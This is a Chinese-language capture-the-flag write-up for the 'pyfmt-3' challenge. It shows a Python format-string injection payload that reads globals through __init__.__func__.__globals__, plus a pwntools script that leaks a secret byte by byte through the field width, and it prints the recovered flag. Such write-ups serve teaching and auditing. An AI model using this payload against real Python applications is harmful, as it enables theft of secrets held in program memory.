# pyfmt-3

## 题目简述

第三题把 name 的花括号转义，使其不能再直接成为 replacement field，但新增了用户可控 width：

~~~python
return f"{self.__class__.__name__}({{self.name:{self.width}}})".format(
    self=self
)
~~~

width 被放进 format specifier。嵌套 replacement field 仍会被求值，只是结果被当成字段宽度而非直接打印。

## 解题过程

FLAG 是 bytes。Python 对 bytes 做下标访问会返回 $0$ 到 $255$ 的整数，正好可以作为 width。对第 $i$ 个字节提交：

~~~text
{self.__init__.__func__.__globals__[FLAG][i]}
~~~

第二次格式化会先取得该字节的整数值，再把 name 用空格填充到对应宽度。选择一个长度为 1 的普通 name，统计 CTF(...) 括号内字符串长度即可恢复该字节。

~~~python
from pwn import remote
import re

flag = bytearray()
index = 0

while not flag.endswith(b"}"):
    io = remote(HOST, PORT)
    width = (
        "{self.__init__.__func__.__globals__[FLAG]"
        f"[{index}]"
        "}"
    )
    io.sendlineafter(b"Name: ", b"A")
    io.sendlineafter(b"Width: ", width.encode())

    line = io.recvline().decode()
    rendered = re.search(r"CTF\((.*)\)", line).group(1)
    flag.append(len(rendered))
    index += 1
    io.close()

print(flag.decode())
~~~

最终恢复：

~~~text
shellmates{wo0o0w_Y0U_M4$T3r3D_pYthon_fOrmAt_STr1nG$!!}
~~~

## 方法总结

受限格式化并不一定没有泄漏通道。攻击者即使只能控制宽度、精度或对齐参数，也可能把敏感整数编码到输出长度、填充数量或报错差异中。审计时应同时检查 replacement field 和 format specifier；对 bytes 逐字节索引返回整数这一语义尤其适合构造长度 oracle。
